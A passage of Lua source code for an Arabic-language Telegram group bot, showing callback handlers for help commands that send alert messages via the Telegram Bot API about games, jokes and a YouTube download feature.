local Text = 'لتجربه العلبه عليك ان تكتب رد عليه يابوت في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help23' then
local Text = 'لتجربه العلبه عليك ان تكتب نكته في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help24' then
local Text = 'لتحميل من المواقع عليك ان تكتب اليتيوب في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help25' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك بالصور في الشات 𖠪'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
--- callback added
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فاير')
